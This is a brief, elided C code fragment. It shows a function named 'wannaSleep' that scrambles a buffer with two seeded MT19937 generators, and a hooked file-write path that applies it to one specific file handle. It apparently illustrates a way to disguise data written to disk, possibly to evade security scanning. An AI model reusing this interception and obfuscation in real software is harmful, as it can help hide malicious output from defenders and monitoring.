...
BYTE* wannaSleep(BYTE* content, DWORD size)
{
	MT19937 prng;
	DWORD seed = *(DWORD*)content;
	MT19937 prng2(seed);
	DWORD64 i;
	HANDLE hHeap;
	BYTE* newContent;
	...
	newContent = (BYTE*)_RtlAllocateHeap(hHeap, 0, size + 4);

	for (i = 0; i < size; ++i) {
		newContent[i] = (content[i] + 0x20) ^ prng.rand() ^ prng2.rand();
	}

	*(DWORD*)(newContent + i) = seed;
...
{
	if (hFile == ghFile) {
		lpBuffer = wannaSleep((BYTE*)lpBuffer, nNumberOfBytesToWrite);
